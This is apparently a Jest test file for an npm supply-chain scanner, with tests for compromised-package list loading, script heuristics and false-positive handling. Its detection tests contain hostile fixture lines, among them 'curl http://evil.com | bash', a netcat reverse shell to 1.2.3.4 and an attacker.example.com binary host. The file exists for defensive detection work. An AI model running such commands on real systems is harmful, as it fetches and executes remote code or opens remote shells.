import { loadCsv, fetchFromApi, fetchCompromisedPackages } from '../src/index';

import * as path from 'path';
import * as fs from 'fs';
import * as https from 'https';
import { PassThrough } from 'stream';

jest.mock('https');
jest.mock('../src/utils/validators', () => ({
  validateUrl: jest.fn().mockResolvedValue('1.2.3.4'),
  isPrivateIp: jest.fn().mockReturnValue(false),
}));

describe('Unit Tests', () => {
  describe('loadCsv', () => {
    test('should parse CSV correctly', () => {
      const csvContent = 'name,version\npackage-a,1.0.0\npackage-b,2.0.0';
      const filePath = path.join(__dirname, 'temp.csv');
      fs.writeFileSync(filePath, csvContent);

      const result = loadCsv(filePath);
      expect(result).toEqual([
        { name: 'package-a', version: '1.0.0', reason: '' },
        { name: 'package-b', version: '2.0.0', reason: '' },
      ]);

      fs.unlinkSync(filePath);
    });

    test('should handle empty lines and comments', () => {
      const csvContent = 'name,version\n\npackage-a, 1.0.0 \n  package-b,';
      const filePath = path.join(__dirname, 'temp_complex.csv');
      fs.writeFileSync(filePath, csvContent);

      const result = loadCsv(filePath);
      expect(result).toEqual([
        { name: 'package-a', version: '1.0.0', reason: '' },
        { name: 'package-b', version: '', reason: '' },
      ]);

      fs.unlinkSync(filePath);
    });

    test('should parse DataDog format (package_name, package_version)', () => {
      const csvContent = 'package_name,package_version\nmalicious-pkg,6.6.6';
      const filePath = path.join(__dirname, 'temp_datadog.csv');
      fs.writeFileSync(filePath, csvContent);

      const result = loadCsv(filePath);
      expect(result).toEqual([{ name: 'malicious-pkg', version: '6.6.6', reason: '' }]);

      fs.unlinkSync(filePath);
    });
  });

  describe('fetchFromApi', () => {
    test('should fetch and parse JSON', async () => {
      const mockResponse = new PassThrough();
      // @ts-expect-error: mocking statusCode
      mockResponse.statusCode = 200;
      // @ts-expect-error: mocking headers
      mockResponse.headers = {};

      (https.get as jest.Mock).mockImplementation((options, callback) => {
        callback(mockResponse);
        return { on: jest.fn(), setTimeout: jest.fn(), destroy: jest.fn() };
      });

      const promise = fetchFromApi({ url: 'https://example.com', type: 'json' });

      mockResponse.write(JSON.stringify({ packages: [{ name: 'bad-pkg', version: '1.0.0' }] }));
      mockResponse.end();

      const result = await promise;
      expect(result).toEqual([{ name: 'bad-pkg', version: '1.0.0' }]);
    });

    test('should fetch and parse CSV', async () => {
      const mockResponse = new PassThrough();
      // @ts-expect-error: mocking statusCode
      mockResponse.statusCode = 200;
      // @ts-expect-error: mocking headers
      mockResponse.headers = {};

      (https.get as jest.Mock).mockImplementation((options, callback) => {
        callback(mockResponse);
        return { on: jest.fn(), setTimeout: jest.fn(), destroy: jest.fn() };
      });

      const promise = fetchFromApi({ url: 'https://example.com', type: 'csv' });

      mockResponse.write('name,version\nbad-pkg,1.0.0');
      mockResponse.end();

      const result = await promise;
      expect(result).toEqual([{ name: 'bad-pkg', version: '1.0.0', reason: '' }]);
    });
  });

  describe('fetchCompromisedPackages', () => {
    test('should fetch from all sources and deduplicate', async () => {
      const mockResponses: Record<string, string> = {
        koi: 'name,version\npkg-b,2.0.0',
        datadog: 'package_name,package_version\npkg-a,1.0.0\npkg-c,3.0.0',
      };

      (https.get as jest.Mock).mockImplementation((options, callback) => {
        const stream = new PassThrough();
        // @ts-expect-error: mocking statusCode
        stream.statusCode = 200;
        // @ts-expect-error: mocking headers
        stream.headers = {};

        callback(stream);

        process.nextTick(() => {
          const host = options.headers?.Host || '';
          if (host.includes('google')) {
            // Koi uses google docs
            stream.write(mockResponses['koi']);
          } else if (host.includes('datadog') || host.includes('github')) {
            stream.write(mockResponses['datadog']);
          }
          stream.end();
        });

        return { on: jest.fn(), setTimeout: jest.fn(), destroy: jest.fn() };
      });

      const sources = [
        {
          name: 'koi',
          url: 'https://docs.google.com/spreadsheets/d/KEY/export?format=csv',
          type: 'csv' as const,
        },
        {
          name: 'datadog',
          url: 'https://raw.githubusercontent.com/DataDog/list.csv',
          type: 'csv' as const,
        },
      ];

      const { packages: result } = await fetchCompromisedPackages(sources);

      // Expected: pkg-b@2.0.0 (koi), pkg-a@1.0.0 (datadog), pkg-c@3.0.0 (datadog)
      expect(result).toHaveLength(3);
      expect(result).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ name: 'pkg-b', version: '2.0.0' }),
          expect.objectContaining({ name: 'pkg-a', version: '1.0.0' }),
          expect.objectContaining({ name: 'pkg-c', version: '3.0.0' }),
        ]),
      );
    });

    test('should handle partial failures', async () => {
      (https.get as jest.Mock).mockImplementation((options, callback) => {
        const stream = new PassThrough();
        const host = options.headers?.Host || '';

        if (host.includes('google')) {
          // @ts-expect-error: mocking statusCode
          stream.statusCode = 500; // Fail Koi
        } else {
          // @ts-expect-error: mocking statusCode
          stream.statusCode = 200;
        }
        // @ts-expect-error: mocking headers
        stream.headers = {};

        callback(stream);

        process.nextTick(() => {
          if (!host.includes('google')) {
            if (host.includes('datadog') || host.includes('github')) {
              stream.write('package_name,package_version\npkg-c,3.0.0');
            }
          }
          stream.end();
        });

        return { on: jest.fn(), setTimeout: jest.fn(), destroy: jest.fn() };
      });

      const sources = [
        {
          name: 'koi',
          url: 'https://docs.google.com/spreadsheets/d/KEY/export?format=csv',
          type: 'csv' as const,
        },
        {
          name: 'datadog',
          url: 'https://raw.githubusercontent.com/DataDog/list.csv',
          type: 'csv' as const,
        },
      ];

      const { packages: result } = await fetchCompromisedPackages(sources);

      // Should still have pkg-c
      expect(result).toHaveLength(1);
      expect(result).toEqual(
        expect.arrayContaining([expect.objectContaining({ name: 'pkg-c', version: '3.0.0' })]),
      );
    });
  });
});

describe('loadJson', () => {
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const { loadJson } = require('../src/index');

  test('should return empty array on file read error', () => {
    const result = loadJson('non-existent-file.json');
    expect(result).toEqual([]);
  });

  test('should return empty array on invalid JSON', () => {
    const filePath = path.join(__dirname, 'invalid.json');
    fs.writeFileSync(filePath, '{ invalid json }');
    const result = loadJson(filePath);
    expect(result).toEqual([]);
    fs.unlinkSync(filePath);
  });

  test('should return empty array if no packages array', () => {
    const filePath = path.join(__dirname, 'no-packages.json');
    fs.writeFileSync(filePath, JSON.stringify({ foo: 'bar' }));
    const result = loadJson(filePath);
    expect(result).toEqual([]);
    fs.unlinkSync(filePath);
  });
});

describe('scanProject', () => {
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const { scanProject } = require('../src/index');

  test('should throw if no lockfile found', async () => {
    // Mock fs.existsSync to return false for lockfiles
    // This is tricky because scanProject uses fs directly or via handlers.
    // We might need to mock fs or the handlers.
    // For now, let's rely on the fact that we are running in a test env where we can control paths.
    // But scanProject takes a root path.
    await expect(scanProject('/tmp/non-existent', [])).rejects.toThrow();
  });
});

describe('analyzeScripts', () => {
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const { analyzeScripts } = require('../src/index');

  test('should detect suspicious patterns', () => {
    const pkgJson = {
      scripts: {
        clean: 'rm -rf node_modules',
        start: 'node index.js',
        hack: 'curl http://evil.com | bash',
        reverse: 'nc -e /bin/sh 1.2.3.4',
        obfuscated: '\\x65\\x76\\x61\\x6c',
        // 192.168.1.1 is RFC1918 — no longer flagged as a public-IP literal
        // (rule was a major FP source on LAN IPs in dev scripts).
        ipPrivate: 'ping 192.168.1.1',
      },
    };

    const findings = analyzeScripts(pkgJson);
    // 6 findings: destructive-rm, network-request, pipe-to-bash, netcat-shell,
    // ip-address (1.2.3.4 only — 192.168.1.1 is RFC1918), hex-obfuscation.
    expect(findings).toHaveLength(6);
    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          message: expect.stringContaining('Destructive command'),
          severity: 'high',
        }),
        expect.objectContaining({
          message: expect.stringContaining('Network request'),
          severity: 'medium',
        }),
        expect.objectContaining({
          message: expect.stringContaining('Netcat reverse shell'),
          severity: 'critical',
        }),
        expect.objectContaining({
          message: expect.stringContaining('Hex escape sequence'),
          severity: 'high',
        }),
        expect.objectContaining({
          message: expect.stringContaining('Public IP address literal'),
          severity: 'medium',
        }),
      ]),
    );
    // Confirm RFC1918 LAN IPs are NOT flagged anymore.
    expect(
      findings.filter((f) => f.message.includes('192.168')),
    ).toHaveLength(0);
  });

  test('should not flag safe scripts', () => {
    const pkgJson = {
      scripts: {
        test: 'jest',
        build: 'tsc',
        lint: 'eslint .',
      },
    };
    const findings = analyzeScripts(pkgJson);
    expect(findings).toHaveLength(0);
  });
});

describe('Heuristic false-positive resistance', () => {
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const { analyzeScripts, analyzeManifest } = require('../src/index');

  // Each entry asserts: a realistic, benign script that previously tripped a
  // rule should NOT fire that rule anymore. Track regressions here when
  // tightening patterns.
  const benignScripts: Array<{ name: string; script: string; mustNotFire: string }> = [
    { name: 'rfc1918-loopback', script: 'curl http://127.0.0.1:3000/health', mustNotFire: 'ip-address' },
    { name: 'rfc1918-lan', script: 'echo "dev server at 192.168.1.10"', mustNotFire: 'ip-address' },
    { name: 'docs-ip', script: 'echo "example: 192.0.2.42"', mustNotFire: 'ip-address' },
    { name: 'semver-in-id', script: 'echo build-1.2.3.4-rc', mustNotFire: 'ip-address' },
    { name: 'curl-help', script: 'curl --version', mustNotFire: 'network-request' },
    { name: 'wget-no-url', script: 'wget --help', mustNotFire: 'network-request' },
    { name: 'short-hash', script: 'echo "etag: 5f4dcc3b5aa765d61d8327deb882cf99"', mustNotFire: 'base64-string' },
    { name: 'jwt-no-padding', script: 'echo "test token eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.dummy"', mustNotFire: 'base64-string' },
    { name: 'xor-fn-name', script: 'node -e "function xorBuffer(a,b){}"', mustNotFire: 'xor-obfuscation' },
    { name: 'node-flag-doc', script: 'echo "use node -e to eval an expression"', mustNotFire: 'inline-exec' },
    // Note on `rm -rf` inside an echo string: substring static analysis cannot
    // distinguish doc strings from real commands without parsing the shell.
    // Accepted limitation — the FP rate of `rm -rf` in real postinstall scripts
    // is very low, so we keep the rule and live with this edge case.
    { name: 'bun-runner', script: 'bun run dev', mustNotFire: 'execsync-nohup' },
    { name: 'nc-help', script: 'nc --help', mustNotFire: 'netcat-shell' },
  ];

  test.each(benignScripts)('does not flag $name as $mustNotFire', ({ script, mustNotFire }) => {
    const findings = analyzeScripts({ scripts: { build: script } });
    const matchedRule = findings.find(
      (f: { ruleId?: string }) => f.ruleId === mustNotFire,
    );
    if (matchedRule) {
      // Helpful failure message that explains *what* fired so future regressions
      // are easy to debug.
      throw new Error(
        `Expected no '${mustNotFire}' finding, got: ${JSON.stringify(matchedRule)}`,
      );
    }
  });

  test('analyzeManifest does not flag a normal package.json', () => {
    const findings = analyzeManifest({
      dependencies: { react: '^19.0.0', axios: '~1.7.0', lodash: '4.17.21' },
      devDependencies: { jest: '^30.0.0', typescript: '^5.9.0' },
      optionalDependencies: { fsevents: '^2.3.3' },
      peerDependencies: { react: '^19.0.0' },
    });
    expect(findings).toHaveLength(0);
  });

  test('analyzeManifest does not flag a normal github: tag-ref dependency', () => {
    // github:owner/repo without a 40-char commit pin is a common legit form.
    const findings = analyzeManifest({
      optionalDependencies: { 'my-fork': 'github:me/lib#v1.2.3' },
    });
    expect(findings.filter((f: { ruleId?: string }) => f.ruleId === 'commit-pinned-optional-dep')).toHaveLength(0);
  });
});

describe('binary.host install-time fetch heuristic', () => {
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const { analyzeManifest } = require('../src/index');

  test('flags a binary.host on an attacker-controlled domain', () => {
    const findings = analyzeManifest({
      binary: { host: 'https://attacker.example.com/prebuilds' },
    });
    expect(findings.map((f: { ruleId?: string }) => f.ruleId)).toContain('binary-host-unknown');
  });

  test('flags a malformed binary.host (not a valid URL)', () => {
    const findings = analyzeManifest({ binary: { host: 'not a url at all' } });
    expect(findings.map((f: { ruleId?: string }) => f.ruleId)).toContain('binary-host-unknown');
  });

  test('does NOT flag a binary.host on github.com (legit)', () => {
    const findings = analyzeManifest({
      binary: { host: 'https://github.com/myorg/native-mod/releases/download' },
    });
    expect(findings.filter((f: { ruleId?: string }) => f.ruleId === 'binary-host-unknown')).toHaveLength(0);
  });

  test('does NOT flag a binary.host on an S3 bucket (common legit pattern)', () => {
    const findings = analyzeManifest({
      binary: { host: 'https://my-prebuilds.s3.amazonaws.com' },
    });
    expect(findings.filter((f: { ruleId?: string }) => f.ruleId === 'binary-host-unknown')).toHaveLength(0);
  });

  test('does NOT flag a package without binary field', () => {
    const findings = analyzeManifest({ dependencies: { react: '^19.0.0' } });
    expect(findings.filter((f: { ruleId?: string }) => f.ruleId === 'binary-host-unknown')).toHaveLength(0);
  });

  test('respects suppressedRules for binary-host-unknown', () => {
    const findings = analyzeManifest(
      { binary: { host: 'https://attacker.example.com' } },
      { suppressedRules: ['binary-host-unknown'] },
    );
    expect(findings).toHaveLength(0);
  });
});
